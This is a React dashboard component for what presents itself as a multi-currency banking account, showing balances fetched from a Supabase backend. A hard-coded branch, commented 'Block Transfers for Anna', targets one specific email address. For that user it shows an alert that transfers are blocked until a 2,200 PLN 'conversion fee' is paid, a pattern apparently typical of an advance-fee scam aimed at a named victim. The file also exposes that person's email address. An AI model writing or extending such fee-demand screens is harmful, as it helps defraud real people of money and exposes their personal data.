
import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { AlertCircle, LogOut } from 'lucide-react';
import { useAuth } from '@/hooks/useAuth';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import { LoadingSpinner } from '@/components/LoadingSpinner';

interface CurrencyBalance {
  currency: string;
  currency_name: string;
  symbol: string;
  balance: number;
  usd_equivalent: number;
}

export default function Dashboard() {
  const { user, logout, loading } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();
  const [balances, setBalances] = useState<CurrencyBalance[]>([]);
  const [loadingBalances, setLoadingBalances] = useState(true);

  useEffect(() => {
    const fetchBalances = async () => {
      setLoadingBalances(true);
      if (!user?.id) return;

      const { data, error } = await supabase.rpc('get_user_balances', {
        uid: user.id,
      });

      if (!error) {
        setBalances(data);
      }

      setLoadingBalances(false);
    };

    if (user?.id && !loading) {
      fetchBalances();
    }
  }, [user, loading]);

  if (loading || loadingBalances) {
    return (
      <div className="p-4">
        <LoadingSpinner />
        <p className="mt-2 text-muted-foreground">Loading your dashboard...</p>
      </div>
    );
  }

  return (
    <div className="p-4">
      <div className="flex justify-between items-center mb-6">
        <h2 className="text-xl font-semibold">Welcome, {user?.email}</h2>
        <Button onClick={logout} variant="outline" size="sm">
          <LogOut className="w-4 h-4 mr-2" /> Logout
        </Button>
      </div>

      {/* 🚫 Block Transfers for Anna */}
      {user?.email === 'keniol9822@op.pl' && (
        <Alert variant="destructive" className="mb-4">
          <AlertCircle className="h-4 w-4" />
          <AlertDescription>
            🚫 <strong>Transfers are currently blocked.</strong><br />
            You have a pending <strong>conversion fee of 2,200 PLN</strong>.<br />
            Please pay this fee to enable bank transfers.
          </AlertDescription>
        </Alert>
      )}

      {/* 💰 Multi-Currency Balances */}
      <Card className="mb-4">
        <CardHeader>
          <CardTitle>Multi-Currency Balances</CardTitle>
          <CardDescription>Your available balances by currency</CardDescription>
        </CardHeader>
        <CardContent>
          <ul className="space-y-2">
            {balances.map((bal) => (
              <li key={bal.currency} className="flex justify-between items-center">
                <span>{bal.currency_name} ({bal.currency})</span>
                <span>
                  {bal.symbol}{Number(bal.balance).toLocaleString()}{" "}
                  {bal.currency !== "USD" && (
                    <span className="text-sm text-muted-foreground ml-1">
                      ≈ ${Number(bal.usd_equivalent).toFixed(2)} USD
                    </span>
                  )}
                </span>
              </li>
            ))}
          </ul>
        </CardContent>
      </Card>
    </div>
  );
}
